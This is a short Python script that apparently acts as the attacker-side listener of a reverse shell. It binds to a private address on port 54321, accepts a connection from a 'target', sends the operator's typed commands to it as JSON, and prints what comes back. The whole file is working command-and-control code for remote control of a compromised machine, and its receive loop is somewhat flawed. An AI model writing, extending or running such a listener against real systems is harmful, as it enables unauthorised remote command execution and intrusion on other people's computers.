#!/usr/bin/env python3
import socket
import json

def nam_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())

def nam_recv():
    json_data = b""
    while True:
        try:
            received_data = target.recv(1024)
            if not received_data:
                break
            json_data += received_data
            return json.loads(json_data.decode())
        except ValueError:
            continue

def shell():
    ip_address = ip[0]  # Extract the IP address from the tuple
    while True:
        command = input("$KaJackPi^8#~%s: " % ip_address)
        print("Sending command:", command)  # Debug print
        nam_send(command)
        if command.lower() == "q":
            break
        else:
            result = nam_recv()
            print("Received result:", result)  # Debug print
            print(result)  # Print the result to stdout

def server():
    global imarkelam
    global ip
    global target
    imarkelam = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    imarkelam.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    imarkelam.bind(("192.168.100.12", 54321))  # Updated IP address
    imarkelam.listen(5)
    print("Listening for Incoming connections!")
    target, ip = imarkelam.accept()
    print("Target Connected!")

if __name__ == "__main__":
    server()
    shell()
    imarkelam.close()

